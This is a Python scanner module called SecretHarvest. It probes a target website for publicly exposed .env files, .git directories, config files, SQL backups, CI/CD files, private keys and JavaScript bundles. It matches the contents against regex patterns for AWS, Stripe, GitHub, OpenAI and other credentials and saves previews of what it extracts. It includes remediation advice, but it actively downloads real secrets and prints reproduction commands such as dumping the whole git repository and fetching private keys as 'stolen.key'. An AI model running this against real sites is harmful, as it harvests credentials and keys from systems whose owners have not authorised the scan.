#!/usr/bin/env python3
"""SecretHarvest — Real Secret & Credential Extraction Module.

Proves actual secret exposure with extracted content:
- .env / .env.local / .env.production — real key=value extraction
- .git/ — config, HEAD, COMMIT_EDITMSG, packed-refs reconstruction
- API keys in JS bundles (AWS, Stripe, GitHub, Twilio, Google, etc.)
- Backup & config files: appsettings.json, web.config, config.yaml, database.sql
- Private key / certificate file exposure
- Docker / CI credential leaks: .dockercfg, .travis.yml, .circleci/config.yml
"""
import asyncio, aiohttp, json, re, sys
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, shannon_entropy,
)

# ── Secret patterns (compiled once) ────────────────────────────────────────────
SECRET_PATTERNS = [
    ("AWS_ACCESS_KEY",      r'AKIA[0-9A-Z]{16}',                                        "CRITICAL", "AWS access key"),
    ("AWS_SECRET_KEY",      r'(?:aws_secret|aws_secret_access_key)\s*[=:]\s*["\']?([A-Za-z0-9+/]{40})["\']?', "CRITICAL", "AWS secret key"),
    ("STRIPE_LIVE_KEY",     r'sk_live_[0-9A-Za-z]{24,}',                               "CRITICAL", "Stripe live secret key"),
    ("STRIPE_TEST_KEY",     r'sk_test_[0-9A-Za-z]{24,}',                               "HIGH",     "Stripe test secret key"),
    ("GITHUB_TOKEN",        r'gh[ps]_[A-Za-z0-9]{36,}',                                "CRITICAL", "GitHub personal access token"),
    ("GITHUB_OAUTH",        r'gho_[A-Za-z0-9]{36,}',                                   "CRITICAL", "GitHub OAuth token"),
    ("GOOGLE_API_KEY",      r'AIza[0-9A-Za-z\-_]{35}',                                 "HIGH",     "Google API key"),
    ("GOOGLE_OAUTH",        r'ya29\.[0-9A-Za-z\-_]+',                                  "HIGH",     "Google OAuth token"),
    ("TWILIO_API_KEY",      r'SK[0-9a-fA-F]{32}',                                      "HIGH",     "Twilio API key"),
    ("TWILIO_TOKEN",        r'(?:twilio.*?token|token.*?twilio)\s*[=:]\s*["\']?([a-f0-9]{32})["\']?', "HIGH", "Twilio auth token"),
    ("SENDGRID_KEY",        r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}',           "HIGH",     "SendGrid API key"),
    ("MAILGUN_KEY",         r'key-[0-9a-zA-Z]{32}',                                    "HIGH",     "Mailgun API key"),
    ("JWT_SECRET_ENV",      r'(?:JWT_SECRET|SECRET_KEY|APP_SECRET|SESSION_SECRET)\s*[=:]\s*["\']?([A-Za-z0-9!@#$%^&*\-_+=/]{8,})["\']?', "CRITICAL", "JWT/session secret"),
    ("DB_PASSWORD",         r'(?:DB_PASS(?:WORD)?|DATABASE_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD|PGPASSWORD)\s*[=:]\s*["\']?([^\s"\'#\n]{4,})["\']?', "CRITICAL", "Database password"),
    ("DB_URL_WITH_CREDS",   r'(?:postgres|mysql|mongodb|redis)://[^:]+:([^@\s"\']{4,})@', "CRITICAL", "Database URL with embedded credentials"),
    ("PRIVATE_KEY_BEGIN",   r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',      "CRITICAL", "Private key file"),
    ("GENERIC_SECRET",      r'(?:secret|password|passwd|api_key|apikey|token|auth_token|private_key)\s*[=:]\s*["\']([A-Za-z0-9!@#$%^&*\-_+=/]{12,})["\']', "HIGH", "Generic secret/credential"),
    ("SLACK_TOKEN",         r'xox[baprs]-[0-9A-Za-z\-]{10,}',                         "HIGH",     "Slack token"),
    ("FIREBASE_KEY",        r'AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}',            "HIGH",     "Firebase server key"),
    ("HEROKU_API_KEY",      r'[hH]eroku.*?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}', "HIGH", "Heroku API key"),
    ("OPENAI_KEY",          r'sk-[A-Za-z0-9]{48}',                                     "HIGH",     "OpenAI API key"),
    ("ANTHROPIC_KEY",       r'sk-ant-[A-Za-z0-9\-]{90,}',                              "HIGH",     "Anthropic API key"),
    ("CLOUDFLARE_TOKEN",    r'(?:cloudflare|cf).*?(?:token|key)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{37,})["\']?', "HIGH", "Cloudflare token"),
    ("AZURE_CONNECTION",    r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{44,}', "CRITICAL", "Azure storage connection string"),
    ("DIGITALOCEAN_KEY",    r'(?:do|digitalocean).*?(?:token|key)\s*[=:]\s*["\']?([a-f0-9]{64})["\']?', "HIGH", "DigitalOcean token"),
]

COMPILED_PATTERNS = [(name, re.compile(pattern, re.I), sev, desc)
                     for name, pattern, sev, desc in SECRET_PATTERNS]

# ── Files to probe ─────────────────────────────────────────────────────────────
ENV_FILES = [
    "/.env",
    "/.env.local",
    "/.env.development",
    "/.env.production",
    "/.env.staging",
    "/.env.backup",
    "/.env.example",
    "/.env.test",
    "/.env.bak",
    "/.env~",
    "/.env.old",
    "/.env.save",
    "/env",
    "/env.txt",
    "/api/.env",
    "/backend/.env",
    "/server/.env",
    "/config/.env",
    "/app/.env",
    "/.envrc",
]

GIT_FILES = [
    "/.git/config",
    "/.git/HEAD",
    "/.git/COMMIT_EDITMSG",
    "/.git/description",
    "/.git/info/exclude",
    "/.git/logs/HEAD",
    "/.git/refs/heads/main",
    "/.git/refs/heads/master",
    "/.git/packed-refs",
    "/.git/FETCH_HEAD",
    "/.gitconfig",
]

CONFIG_FILES = [
    "/appsettings.json",
    "/appsettings.Development.json",
    "/appsettings.Production.json",
    "/web.config",
    "/config.json",
    "/config.yaml",
    "/config.yml",
    "/application.properties",
    "/application.yml",
    "/database.yml",
    "/settings.py",
    "/settings.local.py",
    "/wp-config.php",
    "/wp-config.php.bak",
    "/wp-config.php~",
    "/config/database.yml",
    "/config/secrets.yml",
    "/config/credentials.yml.enc",
    "/config/master.key",
    "/secrets.json",
    "/secrets.yaml",
    "/credentials.json",
    "/serviceAccount.json",
    "/google-credentials.json",
    "/firebase-adminsdk.json",
]

BACKUP_FILES = [
    "/backup.sql",
    "/dump.sql",
    "/database.sql",
    "/db.sql",
    "/backup.zip",
    "/backup.tar.gz",
    "/site.tar.gz",
    "/www.tar.gz",
    "/html.tar.gz",
    "/backup.tar",
    "/db_backup.sql",
    "/data.sql",
    "/export.sql",
    "/backup.json",
    "/old.zip",
]

PRIVATE_KEY_FILES = [
    "/server.key",
    "/private.key",
    "/privkey.pem",
    "/id_rsa",
    "/.ssh/id_rsa",
    "/ssl/private.key",
    "/ssl/server.key",
    "/tls.key",
    "/cert.key",
    "/key.pem",
]

CI_CD_FILES = [
    "/.travis.yml",
    "/.circleci/config.yml",
    "/.github/workflows/deploy.yml",
    "/.github/workflows/ci.yml",
    "/Jenkinsfile",
    "/.gitlab-ci.yml",
    "/.drone.yml",
    "/bitbucket-pipelines.yml",
    "/docker-compose.yml",
    "/docker-compose.prod.yml",
    "/.dockercfg",
    "/.docker/config.json",
    "/Dockerfile",
    "/.kubernetes/deployment.yaml",
    "/k8s/deployment.yaml",
    "/helm/values.yaml",
    "/chart/values.yaml",
]

JS_PATHS = [
    "/static/js/main.js",
    "/static/js/bundle.js",
    "/assets/js/app.js",
    "/js/app.js",
    "/app.js",
    "/bundle.js",
    "/main.js",
    "/dist/bundle.js",
    "/dist/main.js",
    "/build/static/js/main.chunk.js",
    "/build/static/js/2.chunk.js",
    "/public/js/app.js",
    "/assets/app.js",
]


def _scan_for_secrets(content: str, source_label: str) -> list:
    """Scan content string and return list of found secrets."""
    results = []
    for name, pattern, sev, desc in COMPILED_PATTERNS:
        for m in pattern.finditer(content):
            raw = m.group(0)
            value = m.group(1) if m.lastindex and m.lastindex >= 1 else raw
            if len(value) < 8:
                continue
            if shannon_entropy(value) < 2.5 and "password" not in name.lower():
                continue
            results.append({
                "pattern_name": name,
                "severity":     sev,
                "description":  desc,
                "matched_value": value[:80] + ("..." if len(value) > 80 else ""),
                "context":      raw[:120],
                "source":       source_label,
            })
    return results


def _parse_env_file(content: str) -> dict:
    """Parse .env file and return key=value pairs."""
    pairs = {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "=" in line:
            key, _, val = line.partition("=")
            pairs[key.strip()] = val.strip().strip("'\"")
    return pairs


class SecretHarvest:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc
        self.is_https = parsed.scheme == "https"

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 secrets_found=None, extra=None):
        if not meets_confidence_floor(conf):
            return
        f = {
            "type":              ftype,
            "severity":          severity,
            "confidence":        conf,
            "confidence_label":  confidence_label(conf),
            "url":               url,
            "proof":             proof,
            "detail":            detail,
            "remediation":       remediation,
            "proof_type":        "SECRET_EXTRACTION",
            "exploitability":    exploitability,
            "impact":            impact,
            "reproducibility":   reproducibility,
            "auth_required":     False,
            "mitigation_layers": [
                "Move secrets to a secrets manager (AWS Secrets Manager, Vault, Doppler)",
                "Add secret files to .gitignore",
                "Block access to dotfiles at web server level",
                "Rotate all exposed credentials immediately",
            ],
            "secrets_found":     secrets_found or [],
            "mitre_technique":   "T1552.001",
            "mitre_name":        "Credentials In Files",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url}")

    async def _get(self, sess, path, timeout=12):
        url = self.target + path
        try:
            async with sess.get(
                url,
                headers={"User-Agent": random_ua()},
                ssl=False,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception:
            return None, "", {}

    # ── .env file harvesting ──────────────────────────────────────────────────

    async def test_env_files(self, sess):
        print("\n[*] Harvesting .env and environment files...")
        for path in ENV_FILES:
            s, body, hdrs = await self._get(sess, path)
            await delay(0.1)
            if s != 200 or not body or len(body) < 10:
                continue
            ct = hdrs.get("content-type", hdrs.get("Content-Type", "")).lower()
            if "html" in ct and "<html" in body.lower():
                continue

            env_pairs = _parse_env_file(body)
            secrets   = _scan_for_secrets(body, path)

            if not env_pairs and not secrets:
                continue

            safe_pairs = {
                k: (v[:6] + "***" + v[-2:] if len(v) > 8 else "***")
                for k, v in env_pairs.items()
            }

            proof = (
                f"GET {self.target}{path}\n"
                f"→ HTTP {s}  Content-Length: {len(body)} bytes\n"
                f"→ {len(env_pairs)} key=value pairs extracted\n"
                f"→ Keys found: {', '.join(list(env_pairs.keys())[:20])}\n"
                f"→ Secret patterns matched: {len(secrets)}\n"
                f"→ Content preview:\n{body[:800]}"
            )
            top_sev = "CRITICAL" if any(s2["severity"] == "CRITICAL" for s2 in secrets) else "HIGH"
            self._finding(
                ftype="ENV_FILE_EXPOSED",
                severity=top_sev,
                conf=99,
                proof=proof,
                detail=(
                    f"Environment file {path} is publicly accessible. "
                    f"Contains {len(env_pairs)} configuration keys including "
                    f"{', '.join([s2['description'] for s2 in secrets[:3]]) if secrets else 'application secrets'}."
                ),
                url=self.target + path,
                remediation=(
                    "1. Immediately rotate ALL credentials found in this file.\n"
                    "2. Block web server from serving dotfiles: in Nginx: location ~ /\\. { deny all; }\n"
                    "3. Move secrets to environment variables set at the OS/container level or a secrets manager.\n"
                    "4. Add .env* to .gitignore and verify no .env files are in your repo.\n"
                    "5. Audit access logs to determine if this was previously accessed."
                ),
                exploitability=10,
                impact=(
                    f"All application secrets exposed: {', '.join([s2['description'] for s2 in secrets]) if secrets else 'DB passwords, API keys, JWT secrets'}. "
                    "Attacker can immediately take over all connected services."
                ),
                reproducibility=f"curl -s {self.target}{path}",
                secrets_found=secrets,
                extra={"env_keys": list(env_pairs.keys()), "env_preview": safe_pairs},
            )

    # ── .git/ source reconstruction ───────────────────────────────────────────

    async def test_git_exposure(self, sess):
        print("\n[*] Testing .git/ directory exposure...")
        s_head, body_head, _ = await self._get(sess, "/.git/HEAD")
        await delay()
        if s_head != 200 or not body_head or "ref:" not in body_head:
            return

        git_findings = []
        full_content = {"HEAD": body_head}
        secrets_all  = []

        for path in GIT_FILES[1:]:
            s, body, _ = await self._get(sess, path)
            await delay(0.08)
            if s == 200 and body and len(body) > 5:
                full_content[path] = body
                found = _scan_for_secrets(body, path)
                secrets_all.extend(found)

        remote_url = ""
        if "/.git/config" in full_content:
            m = re.search(r'url\s*=\s*(.+)', full_content["/.git/config"])
            if m:
                remote_url = m.group(1).strip()

        proof = (
            f"GET {self.target}/.git/HEAD  → HTTP {s_head}\n"
            f"  Content: {body_head.strip()}\n"
            f"→ .git/ directory publicly accessible — {len(full_content)} git files downloaded\n"
            f"→ Remote URL: {remote_url or 'N/A'}\n"
            f"→ Secrets in git files: {len(secrets_all)}\n"
            f"→ Files accessible: {', '.join(full_content.keys())}\n"
        )
        if "/.git/config" in full_content:
            proof += f"→ .git/config:\n{full_content['/.git/config'][:400]}"

        self._finding(
            ftype="GIT_REPOSITORY_EXPOSED",
            severity="CRITICAL",
            conf=99,
            proof=proof,
            detail=(
                f".git/ directory is publicly accessible at {self.target}. "
                f"Attacker can reconstruct full source code using git-dumper or gitjacker. "
                f"Remote: {remote_url}. {len(secrets_all)} secrets detected in git files."
            ),
            url=self.target + "/.git/HEAD",
            remediation=(
                "1. Block access to .git/ immediately: Nginx: location /.git { deny all; }\n"
                "2. If source code was exposed, rotate ALL secrets (DB passwords, API keys, JWT secrets) found in the repo.\n"
                "3. Use git-secrets or truffleHog to audit commit history for secrets.\n"
                "4. Configure your deployment process to never copy .git/ to the web root."
            ),
            exploitability=10,
            impact=(
                "Full source code reconstruction using git-dumper. "
                "Source code reveals: business logic, all secret keys, SQL queries, internal API endpoints, admin credentials. "
                f"Remote repository: {remote_url}"
            ),
            reproducibility=(
                f"# Install git-dumper: pip install git-dumper\n"
                f"git-dumper {self.target}/.git/ /tmp/recovered-source\n"
                f"# Then inspect: ls /tmp/recovered-source && cat /tmp/recovered-source/.env"
            ),
            secrets_found=secrets_all,
            extra={"remote_url": remote_url, "git_files_found": list(full_content.keys())},
        )

    # ── Config & backup file harvesting ──────────────────────────────────────

    async def test_config_files(self, sess):
        print("\n[*] Scanning config and backup files...")
        for path in CONFIG_FILES:
            s, body, hdrs = await self._get(sess, path)
            await delay(0.1)
            if s != 200 or not body or len(body) < 20:
                continue
            ct = hdrs.get("content-type", hdrs.get("Content-Type", "")).lower()
            if "html" in ct and "<html" in body.lower() and len(body) > 5000:
                continue

            secrets = _scan_for_secrets(body, path)
            has_creds = any(kw in body.lower() for kw in [
                "password", "passwd", "secret", "api_key", "apikey",
                "token", "private", "credential", "connectionstring",
                "datasource", "database",
            ])
            if not secrets and not has_creds:
                continue

            top_sev = "CRITICAL" if any(s2["severity"] == "CRITICAL" for s2 in secrets) else "HIGH"
            proof = (
                f"GET {self.target}{path}\n"
                f"→ HTTP {s}  Size: {len(body)} bytes\n"
                f"→ Credential patterns found: {len(secrets)}\n"
                f"→ Secret types: {', '.join(set(s2['description'] for s2 in secrets)) if secrets else 'password/token keywords present'}\n"
                f"→ Content:\n{body[:800]}"
            )
            self._finding(
                ftype="CONFIG_FILE_WITH_CREDENTIALS_EXPOSED",
                severity=top_sev,
                conf=97,
                proof=proof,
                detail=(
                    f"Configuration file {path} publicly accessible and contains credentials. "
                    f"Secrets detected: {', '.join(set(s2['description'] for s2 in secrets)) if secrets else 'passwords/tokens in content'}."
                ),
                url=self.target + path,
                remediation=(
                    "1. Block access to config files at web server level (deny all for *.json, *.yml, *.config not in a public path).\n"
                    "2. Move all credentials to environment variables or a secrets manager.\n"
                    "3. Rotate all exposed credentials immediately.\n"
                    "4. Audit your deployment pipeline to ensure config files aren't copied to the public web root."
                ),
                exploitability=10,
                impact=f"Direct credential extraction — attacker reads {path} and gets {', '.join(set(s2['description'] for s2 in secrets)) if secrets else 'application credentials'}.",
                reproducibility=f"curl -s {self.target}{path}",
                secrets_found=secrets,
                extra={"file_path": path, "file_size": len(body)},
            )

    # ── CI/CD file exposure ───────────────────────────────────────────────────

    async def test_cicd_files(self, sess):
        print("\n[*] Scanning CI/CD and Docker files for embedded secrets...")
        for path in CI_CD_FILES:
            s, body, hdrs = await self._get(sess, path)
            await delay(0.1)
            if s != 200 or not body or len(body) < 30:
                continue
            ct = hdrs.get("content-type", hdrs.get("Content-Type", "")).lower()
            if "html" in ct and len(body) > 3000:
                continue

            secrets = _scan_for_secrets(body, path)
            has_secrets_kw = any(kw in body.lower() for kw in [
                "password", "secret", "token", "api_key", "private_key",
                "ssh_key", "access_key", "credentials",
            ])
            if not secrets and not has_secrets_kw and len(body) < 100:
                continue

            sev = "CRITICAL" if secrets and any(s2["severity"] == "CRITICAL" for s2 in secrets) else "HIGH"
            proof = (
                f"GET {self.target}{path}\n"
                f"→ HTTP {s}  Size: {len(body)} bytes\n"
                f"→ Secrets detected: {len(secrets)}\n"
                f"→ Content:\n{body[:700]}"
            )
            self._finding(
                ftype="CICD_FILE_WITH_SECRETS_EXPOSED",
                severity=sev,
                conf=95,
                proof=proof,
                detail=(
                    f"CI/CD pipeline or container file {path} is publicly accessible. "
                    "These files commonly contain environment secrets, deploy keys, and cloud credentials."
                ),
                url=self.target + path,
                remediation=(
                    "1. Block web access to CI/CD configuration files.\n"
                    "2. Use secrets management in your CI pipeline (GitHub Actions secrets, GitLab CI variables).\n"
                    "3. Never hardcode secrets in pipeline files — use environment variable references.\n"
                    "4. Rotate any credentials found immediately."
                ),
                exploitability=9,
                impact=(
                    "CI/CD credentials leaked — attacker can deploy malicious code, access cloud infrastructure, "
                    "read/write your repository, or steal production environment secrets."
                ),
                reproducibility=f"curl -s {self.target}{path}",
                secrets_found=secrets,
                extra={"file_path": path},
            )

    # ── Private key / certificate exposure ───────────────────────────────────

    async def test_private_keys(self, sess):
        print("\n[*] Testing private key and certificate exposure...")
        for path in PRIVATE_KEY_FILES:
            s, body, hdrs = await self._get(sess, path)
            await delay(0.1)
            if s != 200 or not body or len(body) < 100:
                continue

            has_key = "-----BEGIN" in body and "PRIVATE KEY" in body
            has_cert = "-----BEGIN CERTIFICATE" in body
            if not has_key and not has_cert:
                continue

            key_type = "PRIVATE KEY" if has_key else "CERTIFICATE"
            lines    = body.count("\n")
            proof = (
                f"GET {self.target}{path}\n"
                f"→ HTTP {s}  Size: {len(body)} bytes  Lines: {lines}\n"
                f"→ {key_type} HEADER FOUND IN RESPONSE!\n"
                f"→ Content:\n{body[:600]}"
            )
            self._finding(
                ftype="PRIVATE_KEY_EXPOSED",
                severity="CRITICAL",
                conf=99,
                proof=proof,
                detail=(
                    f"{'Private key' if has_key else 'Certificate'} file at {path} is publicly downloadable. "
                    "With the private key, an attacker can decrypt all TLS traffic, impersonate the server, "
                    "forge signatures, and break all security guarantees."
                ),
                url=self.target + path,
                remediation=(
                    "1. Immediately revoke and reissue the SSL/TLS certificate.\n"
                    "2. Move private key files outside the web root entirely.\n"
                    "3. Set file permissions: chmod 600 on all private keys, owned by root/ssl-cert only.\n"
                    "4. Rotate all secrets that may have been encrypted under this key.\n"
                    "5. Investigate access logs to determine if key was previously downloaded."
                ),
                exploitability=10,
                impact=(
                    "CRITICAL — attacker can: decrypt all past and future TLS traffic (if RSA key), "
                    "impersonate the server with valid HTTPS, forge signed tokens, "
                    "conduct man-in-the-middle attacks on all users."
                ),
                reproducibility=f"curl -s {self.target}{path} -o stolen.key && openssl rsa -in stolen.key -check",
                secrets_found=[{"pattern_name": "PRIVATE_KEY", "severity": "CRITICAL",
                                "description": key_type, "matched_value": path, "context": body[:80]}],
                extra={"key_type": key_type, "file_size": len(body)},
            )

    # ── JavaScript bundle secret scanning ─────────────────────────────────────

    async def test_js_bundle_secrets(self, sess):
        print("\n[*] Scanning JavaScript bundles for hardcoded secrets...")
        s0, body0, _ = await self._get(sess, "/")
        await delay()
        js_urls_found = []
        if body0:
            for m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body0, re.I):
                path = m.group(1)
                if not path.startswith("http"):
                    js_urls_found.append(path if path.startswith("/") else "/" + path)
        for known in JS_PATHS:
            js_urls_found.append(known)
        js_urls_found = list(dict.fromkeys(js_urls_found))[:25]

        for path in js_urls_found:
            s, body, hdrs = await self._get(sess, path)
            await delay(0.15)
            if s != 200 or not body or len(body) < 200:
                continue
            ct = hdrs.get("content-type", hdrs.get("Content-Type", "")).lower()
            if "javascript" not in ct and not path.endswith(".js"):
                continue

            secrets = _scan_for_secrets(body, path)
            if not secrets:
                continue

            top_sev = "CRITICAL" if any(s2["severity"] == "CRITICAL" for s2 in secrets) else "HIGH"
            secret_summary = ", ".join(set(s2["description"] for s2 in secrets[:5]))
            proof = (
                f"GET {self.target}{path}\n"
                f"→ HTTP {s}  Bundle size: {len(body):,} bytes\n"
                f"→ {len(secrets)} secret pattern(s) found in bundle\n"
                f"→ Secret types: {secret_summary}\n"
                f"→ Samples:\n"
            )
            for s2 in secrets[:3]:
                proof += f"   [{s2['severity']}] {s2['description']}: {s2['matched_value']}\n"

            self._finding(
                ftype="JS_BUNDLE_SECRETS_EXPOSED",
                severity=top_sev,
                conf=94,
                proof=proof,
                detail=(
                    f"JavaScript bundle {path} contains hardcoded secrets: {secret_summary}. "
                    "Client-side JS is fully readable by anyone — these secrets are publicly exposed."
                ),
                url=self.target + path,
                remediation=(
                    "1. Remove ALL secrets from client-side JavaScript — they are always public.\n"
                    "2. For API calls requiring keys, proxy through your backend (never expose keys client-side).\n"
                    "3. Rotate all exposed keys immediately.\n"
                    "4. Use a secret scanning pre-commit hook (git-secrets, detect-secrets, truffleHog) to catch this in future commits.\n"
                    "5. For Google Maps, Firebase, etc.: restrict keys by HTTP referrer and API type."
                ),
                exploitability=10,
                impact=f"All users who visit your site can view these secrets: {secret_summary}. No special tools required — just browser DevTools.",
                reproducibility=f"curl -s {self.target}{path} | grep -oE '(AKIA[A-Z0-9]{{16}}|sk_live_[A-Za-z0-9]{{24,}}|sk-[A-Za-z0-9]{{48}})'",
                secrets_found=secrets,
                extra={"bundle_path": path, "bundle_size": len(body)},
            )

    # ── Backup file detection ─────────────────────────────────────────────────

    async def test_backup_files(self, sess):
        print("\n[*] Scanning for backup and database dump files...")
        for path in BACKUP_FILES:
            s, body, hdrs = await self._get(sess, path)
            await delay(0.1)
            if s != 200 or not body or len(body) < 100:
                continue
            ct = hdrs.get("content-type", hdrs.get("Content-Type", "")).lower()
            is_html_page = "html" in ct and len(body) > 5000

            is_sql = any(kw in body[:500].lower() for kw in
                        ["create table", "insert into", "drop table",
                         "mysql dump", "postgresql dump", "sqlite"])
            is_zip = body[:4] in (b"PK\x03\x04", "PK\x03\x04")
            is_tar = body[:5] in (b"\x1f\x8b\x08\x00", "\x1f\x8b\x08\x00")

            if is_html_page and not is_sql:
                continue

            ftype_label = "SQL_DUMP" if is_sql else ("ARCHIVE" if (is_zip or is_tar) else "BACKUP")
            secrets = _scan_for_secrets(body[:10000], path)

            proof = (
                f"GET {self.target}{path}\n"
                f"→ HTTP {s}  Size: {len(body):,} bytes\n"
                f"→ File type indicators: {'SQL dump' if is_sql else 'archive/binary'}\n"
                f"→ Secrets in dump: {len(secrets)}\n"
                f"→ Content preview:\n{body[:600]}"
            )
            self._finding(
                ftype=f"BACKUP_FILE_{ftype_label}_EXPOSED",
                severity="CRITICAL",
                conf=97,
                proof=proof,
                detail=(
                    f"Backup file {path} publicly downloadable. "
                    f"{'SQL dump contains all database tables, user data, and potentially password hashes.' if is_sql else 'Archive may contain full application source and configuration.'}"
                ),
                url=self.target + path,
                remediation=(
                    "1. Remove backup files from the web root immediately.\n"
                    "2. Store backups in a private storage bucket (S3 private, not public).\n"
                    "3. Rotate all credentials in the dump.\n"
                    "4. Hash/salt passwords before storing — if dump has plaintext passwords, force password reset for all users.\n"
                    "5. Add *.sql, *.zip, *.tar.gz to .gitignore and deny rules."
                ),
                exploitability=10,
                impact=(
                    "Full database dump download — attacker gets all user records, password hashes (or plaintext), "
                    "PII, payment history, and all application data in a single file."
                ),
                reproducibility=f"curl -O {self.target}{path} && wc -l *.sql",
                secrets_found=secrets,
                extra={"file_path": path, "file_size": len(body), "is_sql_dump": is_sql},
            )

    async def run(self):
        print(f"\n{'='*60}\n  SecretHarvest — Real Credential Extraction\n  Target: {self.target}\n{'='*60}")
        timeout   = aiohttp.ClientTimeout(total=18, connect=8)
        connector = aiohttp.TCPConnector(ssl=False, limit=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            await self.test_env_files(sess)
            await self.test_git_exposure(sess)
            await self.test_config_files(sess)
            await self.test_cicd_files(sess)
            await self.test_private_keys(sess)
            await self.test_js_bundle_secrets(sess)
            await self.test_backup_files(sess)

        print(f"\n[+] SecretHarvest complete: {len(self.findings)} confirmed findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No target — set ARSENAL_TARGET", file=sys.stderr)
        sys.exit(1)
    scanner = SecretHarvest(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "secretharvest.json"
    out.write_text(json.dumps(findings, indent=2))
    print(f"[+] Saved {len(findings)} findings → {out}")

if __name__ == "__main__":
    asyncio.run(main())
